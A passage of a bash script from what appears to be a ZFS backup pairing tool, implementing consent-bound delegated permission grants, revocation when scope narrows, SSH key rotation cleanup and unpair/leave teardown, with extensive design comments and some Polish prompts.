commit_scope_dataset_held() {   # <dataset>
    local ds="$1" snap
    while IFS= read -r snap; do
        [ -n "$snap" ] || continue
        zfs holds -H -- "$snap" 2>/dev/null | awk '{print $2}' | grep -qxF "$COMMIT_SCOPE_HOLD_TAG" && return 0
    done < <(zfs list -H -o name -t snapshot -- "$ds" 2>/dev/null)
    return 1
}

do_commit_scope() {
    local label="$1"
    do_commit_scope_check "$label"
    local mpath="$COMMIT_SCOPE_MPATH" sfile="$COMMIT_SCOPE_SFILE" account="$COMMIT_SCOPE_ACCOUNT"
    # do_commit_scope_check sourced the manifest, so a PRIOR commit's list (if
    # any) is already in scope here, before this run's write below replaces it.
    local prior_datasets="${PEER_JOIN_GRANTED_DATASETS:-}"

    # REV-20260804-040: the durable UID binding --leave needs to revoke
    # correctly after the account name may be gone. Verified/captured HERE,
    # before any grant, because this is the one point a live account is
    # guaranteed present (do_commit_scope_check already required it) --
    # --leave, running later and possibly after the account is long gone,
    # has no such guarantee and must never guess.
    if [ "$account" != root ] && id "$account" >/dev/null 2>&1; then
        local live_uid; live_uid=$(id -u "$account")
        if [ -n "${PEER_JOIN_ACCOUNT_UID:-}" ]; then
            [ "$live_uid" = "$PEER_JOIN_ACCOUNT_UID" ] \
                || die "refusing to grant: account '$account' is uid $live_uid, but the manifest for '$label' recorded uid $PEER_JOIN_ACCOUNT_UID at join time -- name/uid drift (account recreated under the same name?) is a collision signal, not something to grant through. Resolve by hand: confirm which uid actually owns this relationship, fix the manifest, then retry."
        else
            # Legacy manifest (joined before this field existed) -- capture
            # now, while the account is confirmed live, rather than leaving
            # --leave to face a missing account with nothing recorded.
            grep -v '^PEER_JOIN_ACCOUNT_UID=' "$mpath" > "${mpath}.tmp"
            printf 'PEER_JOIN_ACCOUNT_UID="%s"\n' "$live_uid" >> "${mpath}.tmp"
            mv "${mpath}.tmp" "$mpath"
            chmod 0600 "$mpath"
            PEER_JOIN_ACCOUNT_UID="$live_uid"
            log "recorded uid $live_uid for account '$account' in the manifest (legacy relationship, joined before this field existed)"
        fi
    fi

    # Same enumerator the consent preview used. It was a separate loop here
    # until REV #117 F2: the preview skipped an unreadable root and showed a
    # smaller number, this loop skipped it too but was free to find it again on
    # a retry, and nothing compared the two. Fail-closed now lives in one place.
    local -a granted=()
    local ds _cs_listing
    _cs_listing=$(join_scope_enumerate "$sfile") || die "refusing to grant: $_cs_listing"
    while IFS= read -r ds; do [ -n "$ds" ] && granted+=("$ds"); done <<< "$_cs_listing"

    # THE BINDING. Set by guided_join_scope from the exact figures the operator
    # was shown and typed back. Checked here, before the first zfs allow, so a
    # pool that changed between the question and the answer -- a dataset
    # created, a root vanishing, a transient read that under-reported -- stops
    # the grant instead of quietly widening it. Absent when --commit-scope is
    # driven directly, which has no preview to bind to.
    if [ -n "${JOIN_ACCEPTED_COUNT:-}" ]; then
        if [ "${#granted[@]}" != "$JOIN_ACCEPTED_COUNT" ]; then
            die "refusing to grant: the operator accepted $JOIN_ACCEPTED_COUNT dataset(s), but ${#granted[@]} are selected now. The pool changed between the consent prompt and the grant. Re-run the join so the number shown is the number granted."
        fi
        if [ "$_cs_listing" != "${JOIN_ACCEPTED_SET:-}" ]; then
            die "refusing to grant: the selected datasets are not the ones the operator accepted, even though the count matches. Something was created and something removed between the consent prompt and the grant. Re-run the join."
        fi
    fi

    # ENROLMENT-AGREED-2026-08-02 U2: finalization is the deliberate act, and
    # the diff it shows is against what is granted TODAY (the manifest's
    # prior list), not the file's previous edit -- after a third edit nobody
    # remembers which version last went out. So the WHOLE plan (grant,
    # revoke, and revoke candidates a hold defers) is computed and printed
    # BEFORE any zfs command runs, not discovered log line by log line as
    # the loop below executes it.
    local -a prior=() revoke_clean=() revoke_held=() revoke_gone=()
    # shellcheck disable=SC2206
    [ -n "$prior_datasets" ] && prior=($prior_datasets)
    local p
    for p in "${prior[@]:-}"; do
        [ -n "$p" ] || continue
        case " ${granted[*]:-} " in *" $p "*) continue ;; esac
        if ! zfs list -H -o name -- "$p" >/dev/null 2>&1; then
            revoke_gone+=("$p")
        elif commit_scope_dataset_held "$p"; then
            revoke_held+=("$p")
        else
            revoke_clean+=("$p")
        fi
    done

    log "commit-scope plan for '$label' ($account):"
    log "  grant:  ${granted[*]}"
    [ "${#revoke_clean[@]}" -gt 0 ] && log "  revoke: ${revoke_clean[*]}"
    [ "${#revoke_held[@]}" -gt 0 ] && log "  left granted, in-flight transfer hold ($COMMIT_SCOPE_HOLD_TAG): ${revoke_held[*]}"
    [ "${#revoke_gone[@]}" -gt 0 ] && log "  already gone from this host, dropping from the record: ${revoke_gone[*]}"

    # `mount` is in this list for a non-obvious reason: ZFS delegation requires
    # the mount ability to DESTROY a snapshot (zfs-allow(8): "destroy ... Must
    # also have the mount ability"), not to mount anything. Found live
    # 2026-08-17 (lab3): the delegated source prune failed every run with
    # 'cannot destroy snapshots: permission denied' while `zfs allow` showed
    # destroy plainly granted -- the missing letter was mount.
    local perms="snapshot,destroy,mount,send,hold,release,bookmark"
    for ds in "${granted[@]}"; do
        zfs allow -u "$account" "$perms" -- "$ds" || die "zfs allow failed for $ds"
        log "delegated ($perms) on $ds to $account"
    done

    # Slice 3 (REV-20260802-033 U3): revoke-on-narrow, bounded strictly by
    # what THIS relationship's own manifest recorded as granted last time --
    # never by what `zfs allow` happens to show for the account now. A
    # dataset is only ever a revoke CANDIDATE if it appears in that recorded
    # list, so a foreign grant (another peer, an older deployment, a manual
    # job) on a dataset this scope file never selected is never even looked
    # at, let alone touched -- it was never a candidate, not spared after
    # consideration.
    local -a still_granted=("${granted[@]}")
    for ds in "${revoke_gone[@]:-}"; do
        [ -n "$ds" ] || continue
        log "revoke-on-narrow: $ds no longer exists on this host -- nothing to revoke"
    done
    for ds in "${revoke_held[@]:-}"; do
        [ -n "$ds" ] || continue
        warn "revoke-on-narrow: $ds has an in-flight transfer hold ($COMMIT_SCOPE_HOLD_TAG) -- refusing to revoke mid-transfer. Left granted; re-run --commit-scope=$label once the transfer completes to finish narrowing."
        still_granted+=("$ds")
    done
    for ds in "${revoke_clean[@]:-}"; do
        [ -n "$ds" ] || continue
        if zfs unallow -u "$account" "$perms" -- "$ds" 2>/dev/null; then
            log "revoke-on-narrow: revoked ($perms) on $ds from $account -- no longer in scope for '$label'"
        else
            warn "revoke-on-narrow: could not revoke $account's grant on $ds -- left as-is, resolve by hand"
            still_granted+=("$ds")
        fi
    done

    # Same list, so the quiesce scope cannot drift from the replication scope
    # -- identical reasoning to the pre-slice-2 code this replaces. Uses
    # still_granted, not granted: a dataset held back from revoke above keeps
    # its quiesce grant too, for the same reason it keeps its ZFS permission.
    if [ "$ALLOW_QUIESCE" -eq 1 ]; then
        install_quiesce_grant "$account" "${still_granted[*]}"
    else
        log "guest quiesce NOT granted to $account -- remote quiesce (snapget -q) will refuse. Re-run --commit-scope=$label --allow-quiesce if this peer should be able to freeze guests here."
    fi

    # Recorded for the NEXT narrower commit: what this relationship grants as
    # of right now (still_granted), not what it merely selected this time
    # (granted) -- a dataset held back above must stay recorded as granted,
    # or the next commit would treat it as already gone and never retry the
    # revoke.
    grep -v '^PEER_JOIN_GRANTED_DATASETS=' "$mpath" > "${mpath}.tmp"
    printf 'PEER_JOIN_GRANTED_DATASETS="%s"\n' "${still_granted[*]}" >> "${mpath}.tmp"
    mv "${mpath}.tmp" "$mpath"
    chmod 0600 "$mpath"

    # ENROLMENT-AGREED-2026-08-02 T3: a hash instead of a second manifest. The
    # collector (slice 6) fetches this alongside the scope file and refuses
    # to generate/activate from a copy whose hash does not match -- proof
    # that what it just fetched is EXACTLY what was granted from, not an
    # edit made on the source after the last --commit-scope. World-readable
    # for the same reason the scope file itself is (REV-033 slice 4
    # follow-up): the collector reads it as its delegated account, not root.
    local hpath; hpath=$(peer_scope_granted_hash_path "$label")
    local digest; digest=$(sha256sum -- "$sfile" 2>/dev/null | awk '{print $1}')
    [ -n "$digest" ] || die "could not compute a sha256 of $sfile -- grant already committed, but the hash sidecar is missing. Re-run --commit-scope=$label to retry writing it"
    local htmp; htmp=$(mktemp) || die "mktemp failed"
    printf '%s\n' "$digest" > "$htmp"
    chmod 0644 "$htmp" 2>/dev/null
    mv -f "$htmp" "$hpath" || die "could not write $hpath"

    log "commit-scope complete for '$label': ${#granted[@]} dataset(s) granted to $account, ${#revoke_clean[@]} revoked, ${#revoke_held[@]} held back, ${#revoke_gone[@]} already gone"
}

# True only when the exact bytes currently visible in LABEL.scope are the bytes
# most recently granted. This is the durable resume point for guided --join:
# a completed rerun must not reopen an editor or re-grant merely because the
# package was submitted again.
join_scope_is_committed() {   # <label>
    local label="$1" sfile hfile want got
    sfile=$(peer_scope_path "$label")
    hfile=$(peer_scope_granted_hash_path "$label")
    [ -r "$sfile" ] && [ -r "$hfile" ] || return 1
    want=$(awk 'NR==1 {print; exit}' "$hfile" 2>/dev/null)
    got=$(sha256sum -- "$sfile" 2>/dev/null | awk '{print $1}')
    [ -n "$want" ] && [ "$want" = "$got" ]
}

# Normal source-side enrolment after do_join publishes the manifest. The old
# --draft-scope/--commit-scope verbs stay available for expert repair, but the
# ordinary operator does not have to discover or sequence them. The proposed
# ACTIVE portion is always shown before the single accept/edit decision.
# WHAT ACCEPTING THIS COSTS, said before the question is asked.
#
# Measured 2026-08-22 on the mandated four-command path of issue #9: the
# collector named only a --target, so this host had nothing to narrow to and
# proposed its whole estate -- 22 datasets including every guest volume. One
# keystroke granted a lab collector snapshot,destroy,send,hold on production
# VM disks, the OpenVPN gateway's among them. The proposal itself was not
# wrong; this IS what the source has. What was wrong is that accepting it cost
# one character while the consequence was delegated destroy rights over
# everything.
#
# So three things happen here, and none of them narrows the proposal -- for a
# Proxmox backup tool the guest volumes usually ARE the payload, and a
# heuristic that hid them would be wrong more often than right:
#   1. say plainly what the collector did NOT ask for;
#   2. state the magnitude before the question, because a human judges
#      "22 datasets, 5.4 TB" faster than a list of 22 names;
#   3. take a consent that cannot be muscle memory. Reflex is the thing that
#      actually fails here -- anyone who means it types the number without effort.
# ONE enumerator, used by BOTH the consent preview and the grant that follows
# it. REV finding F2 on #117: there were two, and they disagreed by design --
# the preview skipped any root whose `zfs list` failed and reported the smaller
# number, then do_commit_scope re-enumerated independently and delegated the
# larger set. The operator consented to a magnitude that was never binding on
# anything. A single implementation cannot drift from itself.
#
# FAIL-CLOSED throughout. Every read that could make the answer smaller than
# the truth is an error, not a zero: an unreadable scope file, a root that
# cannot be listed, a listing that fails mid-way. The old code turned all three
# into silent shrinkage, which is the direction that matters -- under-reporting
# the scope is what buys consent for more than was shown.
#
# On failure the REASON is printed on stdout, where the list would have been,
# and the exit status says which it is. A global would have been the obvious
# choice and is the wrong one: every caller reads this through $( ), so a
# variable set inside dies with the subshell and the refusal arrives with an
# empty explanation -- or, under `set -u`, with an unbound-variable abort
# instead of the message. Found by the discriminating test, not by reading.
#
# Output is deduplicated and sorted so the set is comparable as a string.
# Overlapping roots (rpool and rpool/data) previously counted a dataset twice
# in the preview and once in the grant.
join_scope_enumerate() {   # <scope file> -> deduplicated, sorted dataset names, one per line
    local sfile="$1" root ds listing
    if ! scope_read "$sfile" >/dev/null 2>&1; then
        printf 'scope file %s could not be read: %s' "$sfile" "${SCOPE_ERR:-unparseable}"
        return 1
    fi
    local -a out=()
    for root in "${SCOPE_ROOTS[@]}"; do
        if ! zfs list -H -o name -- "$root" >/dev/null 2>&1; then
            printf "scope root '%s' could not be read -- it does not exist on this host, or zfs list failed. Refusing rather than granting a scope nobody could measure; if the root is genuinely gone, edit it out of %s and retry." "$root" "$sfile"
            return 1
        fi
        # Captured, not piped from a process substitution: a `zfs list -r` that
        # dies half-way through a large pool used to end the loop with a short
        # answer and no error anywhere.
        listing=$(zfs list -H -o name -r -- "$root") || {
            printf "zfs list -r failed under scope root '%s' -- the scope cannot be measured, so it will not be granted" "$root"
            return 1
        }
        while IFS= read -r ds; do
            [ -n "$ds" ] || continue
            scope_includes "$ds" || continue
            case " ${out[*]:-} " in *" $ds "*) continue ;; esac
            out+=("$ds")
        done <<< "$listing"
    done
    if [ "${#out[@]}" -eq 0 ]; then
        printf 'scope file %s selects nothing that exists on this host -- nothing to grant' "$sfile"
        return 1
    fi
    printf '%s
' "${out[@]}" | LC_ALL=C sort
}

join_scope_summary() {   # <scope file> -> "<count> <guest-volume count> <bytes>"
    local sfile="$1" ds g=0 bytes=0 used listing
    listing=$(join_scope_enumerate "$sfile") || { printf '%s' "$listing"; return 1; }
    local -a sel=()
    while IFS= read -r ds; do [ -n "$ds" ] && sel+=("$ds"); done <<< "$listing"
    for ds in "${sel[@]}"; do
        case "${ds##*/}" in
            vm-[0-9]*-disk-*|vm-[0-9]*-cloudinit|subvol-[0-9]*-disk-*) g=$((g + 1)) ;;
        esac
        # A failed `zfs get used` used to become 0 and quietly shrink the total
        # the operator was shown. It is now a refusal like the rest.
        used=$(zfs get -Hp -o value used -- "$ds" 2>/dev/null) || {
            printf 'zfs get used failed for %s -- the size shown to the operator would understate the scope' "$ds"
            return 1
        }
        case "$used" in ''|*[!0-9]*)
            printf "zfs get used returned '%s' for %s -- refusing to present an unmeasured scope as a number" "$used" "$ds"
            return 1 ;;
        esac
        bytes=$((bytes + used))
    done
    printf '%s %s %s' "${#sel[@]}" "$g" "$bytes"
}

join_human_bytes() {   # <bytes>
    awk -v b="$1" 'BEGIN{
        split("B KiB MiB GiB TiB PiB", u, " "); i = 1
        while (b >= 1024 && i < 6) { b /= 1024; i++ }
        printf (i == 1 ? "%d %s" : "%.1f %s"), b, u[i]
    }'
}

guided_join_scope() {   # <label>
    local label="$1" sfile choice editor
    local _js_n _js_g _js_b _js_sum _js_set
    sfile=$(peer_scope_path "$label")

    if join_scope_is_committed "$label"; then
        log "scope for '$label' is already committed and byte-identical -- resuming join needs no further work"
        return 0
    fi
    if [ ! -e "$sfile" ]; then
        do_draft_scope "$label"
    fi

    while :; do
        echo
        echo "Proponowany zakres backupu dla '$label':"
        echo "------------------------------------------------------------"
        awk '/^# ==========================================================/{exit} {print}' "$sfile"
        echo "------------------------------------------------------------"
        # 1. What the collector did NOT say. Without this line the proposal
        #    reads as a considered selection rather than "everything I have".
        if [ -z "${PEER_JOIN_DATASETS:-}${PEER_JOIN_REQUESTED:-}" ]; then
            echo "!!! Kolektor NIE wskazal zadnego datasetu -- podal tylko cel"
            echo "!!! (--target=${PEER_JOIN_TARGET:-?}). Ta propozycja to zatem"
            echo "!!! CALY majatek tego hosta, nie wybor zrobiony dla Ciebie."
        else
            echo ">>> Kolektor prosil o: ${PEER_JOIN_DATASETS:-}${PEER_JOIN_REQUESTED:-}"
        fi
        # 2. The magnitude, before the question. A measurement that failed is
        #    not a small scope -- it is no scope, and the join stops here
        #    rather than asking the operator to consent to a number nobody
        #    could compute.
        _js_sum=$(join_scope_summary "$sfile")             || die "refusing to ask for consent: $_js_sum"
        read -r _js_n _js_g _js_b <<< "$_js_sum"
        # The exact set behind that number, captured HERE, so what the operator
        # accepts is what do_commit_scope must find when it grants. Re-reading
        # the pool between the two is the whole hole this closes.
        _js_set=$(join_scope_enumerate "$sfile")             || die "refusing to ask for consent: $_js_set"
        echo ">>> Przyjecie nada kontu ${PEER_JOIN_ACCOUNT:-?} prawa"
        echo ">>>   snapshot,destroy,mount,send,hold,release,bookmark"
        echo ">>> na $_js_n dataset(ach), w tym $_js_g wolumen(ach) maszyn, lacznie $(join_human_bytes "$_js_b")."
        echo "------------------------------------------------------------"
        # 3. A consent reflex cannot give. Typing the count is trivial for
        #    anyone who read the line above, and impossible to do by habit.
        read -rp "Wpisz liczbe datasetow ($_js_n) aby ZAAKCEPTOWAC, [e]dytuj, [n]przerwij: " choice \
            || die "join interrupted before scope acceptance"
        case "$choice" in
            "$_js_n")
                # Bind the accepted count AND the accepted set to the grant.
                # do_commit_scope refuses if either has moved since the number
                # above was printed, BEFORE its first zfs allow.
                JOIN_ACCEPTED_COUNT="$_js_n" JOIN_ACCEPTED_SET="$_js_set"                     do_commit_scope "$label"
                join_scope_is_committed "$label" \
                    || die "scope grant finished without a matching hash read-back"
                log "scope accepted and committed for '$label'"
                return 0
                ;;
            e|E|edit|EDIT)
                editor="${VISUAL:-${EDITOR:-vi}}"
                $editor "$sfile" \
                    || die "editor '$editor' failed; scope was not committed"
                do_commit_scope_check "$label"
                ;;
            n|N|nie|NIE|q|Q)
                die "scope was not accepted; no ZFS grant was committed"
                ;;
            *)
                warn "type the dataset count to accept, e to edit, or n to stop"
                ;;
        esac
    done
}


# do_revoke_old -- the ONLY step in this whole feature that removes something.
# Deliberately its own explicit command, only runs mid-rotation, and only ever
# touches the one exact key line recorded at --rotate time.
do_revoke_old() {
    local label="$1" mpath="$2"
    [ -r "$mpath" ] || die "no pairing manifest for '$PEER_HOST' -- nothing to revoke"
    # shellcheck disable=SC1090
    . "$mpath"
    [ "${PEER_ROTATING:-no}" = "yes" ] || die "peer '$PEER_HOST' is not mid-rotation (manifest says rotating=no) -- nothing to revoke"

    local keyfile="$PEER_KEY_DIR/${label}_ed25519"
    local newkey="${keyfile}.new"
    [ -f "$newkey" ] || die "expected $newkey from --rotate, not found -- rotation state is inconsistent, resolve by hand"
    [ -n "${PEER_PREVIOUS_PUBKEY:-}" ] || die "manifest has no PEER_PREVIOUS_PUBKEY -- cannot safely identify which line to remove, resolve by hand"

    local remote_user="${PEER_SAVED_ACCOUNT:-root}"
    log "removing the OLD key from ${remote_user}@${PEER_HOST} using the already-verified NEW key..."
    # The old key's exact content travels over stdin, never embedded in the
    # remote command line -- avoids any shell-quoting risk on either end.
    printf '%s\n' "$PEER_PREVIOUS_PUBKEY" | ssh -i "$newkey" -p "${PEER_SAVED_PORT:-22}" \
        -o BatchMode=yes -o StrictHostKeyChecking=yes "${remote_user}@${PEER_HOST}" \
        'read -r oldline; f=~/.ssh/authorized_keys; grep -vF "$oldline" "$f" > "$f.tmp.$$" && mv "$f.tmp.$$" "$f"' \
        || die "could not remove the old key on the peer over SSH -- did you verify the new key with a dry-run first? Old key left in place, nothing changed."

    rm -f "$keyfile" "${keyfile}.pub"
    mv "$newkey" "$keyfile"
    mv "${newkey}.pub" "${keyfile}.pub"
    # The delegated account's copy still holds the key we just revoked. Refresh
    # it HERE, at the one moment the new key is both proven and promoted --
    # miss this and rotation quietly breaks every job running as that account
    # while root's own path keeps working, which is the worst way to find out.
    if [ -n "${PEER_SAVED_LOCAL_USER:-}" ]; then
        install_local_pairing_files "$keyfile" "$PEER_KEY_DIR/${label}_known_hosts" \
            "$label" "$PEER_SAVED_LOCAL_USER"
    fi
    local new_current; new_current=$(cat "${keyfile}.pub")
    sed -i -e 's/^PEER_ROTATING=.*/PEER_ROTATING=no/' \
           -e "s|^PEER_PREVIOUS_PUBKEY=.*|PEER_PREVIOUS_PUBKEY=''|" \
        "$mpath"
    # PEER_CURRENT_PUBKEY may contain '/' or other sed-hostile characters (it
    # is base64), so it is rewritten with a fresh cat > rather than another
    # sed substitution.
    grep -v '^PEER_CURRENT_PUBKEY=' "$mpath" > "${mpath}.tmp"
    printf "PEER_CURRENT_PUBKEY='%s'\n" "$new_current" >> "${mpath}.tmp"
    mv "${mpath}.tmp" "$mpath"
    log "rotation complete for '$PEER_HOST' -- $keyfile is now the only active key, cron lines referencing it need no change"
}

# Anything still running the pairing key is the one thing --unpair must not
# walk past. Delete the key out from under a live cron line and the relationship
# does not end cleanly -- it turns into a job that fails every night and mails
# about it, which is strictly worse than the pairing it replaced. Checked before
# any state is touched, and refused rather than warned: there is no version of
# "continue anyway" here that leaves the host in a good state.
unpair_assert_no_cron_users() {
    local label="$1" local_user="$2"
    local -a users=(root)
    [ -n "$local_user" ] && users+=("$local_user")
    local u found=0 hits
    for u in "${users[@]}"; do
        hits=$(crontab -l -u "$u" 2>/dev/null \
            | grep -F -e "${label}_ed25519" -e "pairing-${label}_" -e "@${PEER_HOST}:") || true
        [ -n "$hits" ] || continue
        found=1
        warn "crontab of '$u' still uses this pairing:"
        printf '%s\n' "$hits" | while IFS= read -r line; do warn "    $line"; done
    done
    [ "$found" -eq 0 ] && return 0
    # The remedy is stated as an ORDER, because the obvious order does not work
    # and the previous wording prescribed it. Removing the crontab line first is
    # useless -- the config puts it straight back on the next generate -- and
    # stripping the config section then running gen-cron --install fails whenever
    # that section was the last rule, since gen-cron rightly refuses to install a
    # config with no send/prune/monitor rules at all. That is the ordinary shape
    # for a collector tearing down its only client, and following the old text led
    # in a circle (measured live, pve1<->pve2, 2026-08-14).
    die "refusing to unpair '$PEER_HOST' while the lines above still run. On the collector, use 'zfs-backup.sh remove-client <name>'; it removes only this client's owned config sections and updates the shared cron block safely. Expert manual recovery: remove only this relationship's owned sections from the gen-cron config. If any dataset/prune/monitor rules remain, run 'gen-cron.sh -c <config> --install' so the block is replaced with those remaining jobs. Only if zero rules remain, remove the zfs-backup-managed block directly because gen-cron.sh correctly refuses to install an empty ruleset. Removing only the crontab line leaves the config to put it back on the next generate."
}

# Revoking the grant this pairing made does NOT mean the account lost access.
# `zfs allow` is inherited, so a broader grant on any ANCESTOR still covers the
# per-peer root -- and unallowing somebody else's ancestor grant would be well
# outside what --unpair was asked to do. So it is reported instead of touched.
#
# Found live, not by reading: on pve1 the target sat under hdd/backuptest_targets,
# which already had a Local+Descendent grant for the same account from unrelated
# work. --unpair logged "revoked", and the account could still snapshot the
# dataset a second later. "Revoked" was true and misleading at the same time,
# which is the worst kind of accurate log line.
unpair_report_residual_access() {
    local user="$1" dataset="$2"
    local residual
    residual=$(zfs allow "$dataset" 2>/dev/null | awk -v u="$user" '
        /^---- Permissions on /    { ds = $4 }
        $1 == "user" && $2 == u    { if (ds != "") print ds }' | sort -u) || return 0
    [ -n "$residual" ] || return 0
    warn "$user STILL has effective access to $dataset -- inherited from a grant on: $(printf '%s' "$residual" | tr '\n' ' ')"
    warn "that grant predates this pairing and is not ours to remove; if isolation is the point, revoke it by hand: zfs unallow -u $user <ten dataset>"
}

# do_unpair -- end the relationship on THIS side and print exactly what to run
# on the peer.
#
# Deliberately one-sided, unlike --revoke-old which does reach across. At
# decommission time there is no reason to assume the ssh path still works --
# that is often WHY someone is unpairing -- and creating/deleting an account on
# somebody else's machine over a link that is being torn down is the wrong
# default. The commands are printed with the exact key content so the admin can
# run them from that host's own console and watch them happen.
#
# Never touches received DATA. A backup that outlives the relationship is the
# normal case, not an accident; destroying it would make --unpair the most
# dangerous flag in this script. Same reason /root/.ssh/known_hosts is left
# alone: a pinned host key is our record of who they are, not a grant to them,
# and it may well be relied on by something else on this host by now.
do_unpair() {
    local label="$1" mpath="$2"
    [ -r "$mpath" ] || die "no pairing for '$PEER_HOST' on this host -- nothing to unpair (looked for $mpath)"
    # shellcheck disable=SC1090
    . "$mpath"

    local local_user="${PEER_SAVED_LOCAL_USER:-}"
    unpair_assert_no_cron_users "$label" "$local_user"

    local keyfile="$PEER_KEY_DIR/${label}_ed25519"
    local rotating="${PEER_ROTATING:-no}"

    # Mid-rotation the peer has TWO keys authorized, so the instructions below
    # must remove both. Handled rather than refused: being unable to tear down
    # until you first finish a rotation you no longer want is a silly place to
    # be stuck.
    [ "$rotating" = "yes" ] && warn "peer '$PEER_HOST' was mid-rotation -- the peer has TWO authorized keys and both are listed below"

    rm -f "$keyfile" "${keyfile}.pub" "${keyfile}.new" "${keyfile}.new.pub" \
          "$PEER_KEY_DIR/${label}_known_hosts"
    log "removed the pairing keys and pinned host key for '$PEER_HOST'"

    if [ -n "$local_user" ]; then
        local home_dir; home_dir=$(getent passwd "$local_user" | cut -d: -f6)
        if [ -n "$home_dir" ]; then
            rm -f "$home_dir/.ssh/pairing-${label}_ed25519" \
                  "$home_dir/.ssh/pairing-${label}_known_hosts"
            log "removed $local_user's copies"
        else
            warn "account '$local_user' from the manifest no longer exists -- its copies (if any) were left alone"
        fi
    fi

    # Only the delegation this pairing granted, only on the per-peer root, and
    # only for pull -- for push the receive side was never delegated here.
    if [ "${PEER_SAVED_ROLE:-pull}" = "pull" ] && [ -n "$local_user" ]; then
        local dest_root="${PEER_SAVED_TARGET:-}/$label"
        if [ -n "${PEER_SAVED_TARGET:-}" ] && zfs list -H -o name "$dest_root" >/dev/null 2>&1; then
            if zfs unallow -u "$local_user" "$ZFS_PERMS" "$dest_root" 2>/dev/null; then
                log "revoked $local_user's delegation on $dest_root"
                warn "any prune/monitor job for $dest_root running as $local_user will now fail -- re-grant with: zfs allow -u $local_user $ZFS_PERMS $dest_root"
                unpair_report_residual_access "$local_user" "$dest_root"
            else
                warn "could not revoke the delegation on $dest_root -- check it by hand: zfs allow $dest_root"
            fi
        fi
        [ -n "${PEER_SAVED_TARGET:-}" ] && log "DATA LEFT IN PLACE: $dest_root (unpairing ends the relationship, not the backup)"
    fi

    rm -f "$mpath"
    rm -f "/root/scripts/pairing/${label}.conf.suggested" \
          "/root/scripts/pairing/"*"-to-${PEER_HOST}.tgz" \
          "/root/scripts/pairing/"*"-to-${PEER_HOST}-rotate.tgz"
    log "removed the manifest and any leftover wsad/draft for '$PEER_HOST'"

    local remote_user="${PEER_SAVED_ACCOUNT:-root}"
    # Sanitized the same way do_join sanitizes PEER_CONF_INITIATOR_LABEL --
    # computed here (not just below, next to the manifest-path print) so the
    # pull branch can reference it too.
    local my_label; my_label=$(hostname -s 2>/dev/null || hostname)
    my_label=$(printf '%s' "$my_label" | tr -c 'A-Za-z0-9._-' '-')
    echo
    echo ">>> ===================================================================="
    echo ">>> Strona lokalna posprzatana. Reszta jest na $PEER_HOST -- uruchom tam"
    echo ">>> z konsoli (nie stad: to konto i te uprawnienia sa ich, nie nasze):"
    echo ">>> ===================================================================="
    if [ "${PEER_SAVED_AS:-delegated}" != "delegated" ]; then
        echo "  # konto to root (--as=root), wiec zostaje -- usun sam klucz:"
        printf '  grep -vF %s ~/.ssh/authorized_keys > /tmp/ak.$$ && mv /tmp/ak.$$ ~/.ssh/authorized_keys\n' \
            "'${PEER_CURRENT_PUBKEY:-<brak w manifescie>}'"
        if [ "$rotating" = "yes" ] && [ -n "${PEER_PREVIOUS_PUBKEY:-}" ]; then
            printf '  grep -vF %s ~/.ssh/authorized_keys > /tmp/ak.$$ && mv /tmp/ak.$$ ~/.ssh/authorized_keys\n' \
                "'${PEER_PREVIOUS_PUBKEY}'"
        fi
        echo "  # usun manifest stworzony tam przez --join"
        echo "  rm -f $(peer_manifest_path "$my_label")"
    elif [ "${PEER_SAVED_ROLE:-pull}" = pull ]; then
        # REV-20260804-039 F3: this used to print a manual "zfs unallow ...;
        # userdel" pair here, bounded by PEER_SAVED_DATASETS -- the PAIRING-
        # time list, which is empty for any mode-based client (dataset
        # selection happens later, via --commit-scope). Every mode-based
        # relationship therefore printed ZERO unallow commands, and an
        # operator following them literally ran userdel with no revoke at
        # all -- confirmed live, Gate J: the grant survived as an orphaned
        # numeric-UID entry. --leave reads the PEER's own manifest instead,
        # which has the real granted-dataset list regardless of how it was
        # chosen, revokes by UID before removing the account, AND removes
        # the manifest/scope/hash itself -- no separate rm -f step here.
        echo "  deploy.sh --leave=$my_label"
    else
        # push_dest_root, from the peer's own point of view: do_join computes
        # it as $PEER_CONF_TARGET/$PEER_CONF_INITIATOR_LABEL -- from here,
        # that is this relationship's own PEER_SAVED_TARGET/$my_label.
        local push_dest_root="${PEER_SAVED_TARGET:-<TARGET>}/$my_label"
        echo "  # 1. cofnij delegacje ZFS na wlasnym celu odbioru (dataset ZOSTAJE)"
        echo "  zfs unallow -u $remote_user $push_dest_root"
        echo "  # 2. usun konto razem z jego authorized_keys"
        echo "  userdel -r $remote_user"
        echo "  # 3. usun manifest stworzony tam przez --join"
        echo "  rm -f $(peer_manifest_path "$my_label")"
    fi
    echo ">>> ===================================================================="
    echo ">>> Klucz hosta $PEER_HOST zostal w /root/.ssh/known_hosts -- to nasz"
    echo ">>> zapis o tym, kim oni sa, nie uprawnienie dla nich. Jesli naprawde"
    echo ">>> chcesz go usunac: ssh-keygen -f /root/.ssh/known_hosts -R $PEER_HOST"
    echo ">>> (usunie WSZYSTKIE wpisy dla tego hosta, nie tylko przypiety tutaj)."
    echo ">>> ===================================================================="
}

# do_leave <label> -- REV-20260804-039 F3: run on the PEER (this host), tears
# down its side of a pull relationship. --unpair only ever PRINTS these steps
# for an operator to run by hand on the peer console -- this actually runs
# them, bounded strictly by what THIS host's own join manifest recorded, the
# same "never touch what was never a candidate" discipline do_commit_scope's
# revoke-on-narrow already uses.
#
# Found live (REV-20260804-037 Gate J): userdel does NOT touch zfs allow --
# deleting the account first left an orphaned grant under the bare numeric
# UID ("user (unknown: 1001)"), invisible to `zfs allow` by name and a real
# durable-authorization risk if that UID is ever reused. Order matters:
# capture the UID, revoke by UID (works even if userdel already ran and the
# name is gone -- makes a repeated call after a partial failure safe), VERIFY
# nothing remains, only THEN userdel.
do_leave() {
    local label="$1"
    [ -n "$label" ] || die "internal: do_leave needs a label"
    local mpath; mpath=$(peer_manifest_path "$label")
    [ -r "$mpath" ] || die "no join manifest for '$label' at $mpath -- nothing to leave (was --join even run here under this label?)"
    # shellcheck disable=SC1090
    . "$mpath"
    [ "${PEER_JOIN_ROLE:-}" = pull ] \
        || die "'$label' is role=${PEER_JOIN_ROLE:-?} -- --leave only tears down the PULL side (a scope-granted account on this host); a push peer's teardown is --unpair on the COLLECTOR, which owns that receive delegation"
    local account="${PEER_JOIN_ACCOUNT:-}"
    [ -n "$account" ] || die "internal: manifest for '$label' has no account recorded"

    if [ "${PEER_JOIN_AS:-}" = root ]; then
        log "'$label' joined with --as=root -- no delegated account or grant to remove here; just cleaning up state"
    else
        # REV-20260804-040: the durable principal binding is the ONLY thing
        # --leave may revoke by -- never a scan of `zfs allow`'s output. A
        # dataset can carry more than one numeric/unknown principal (another
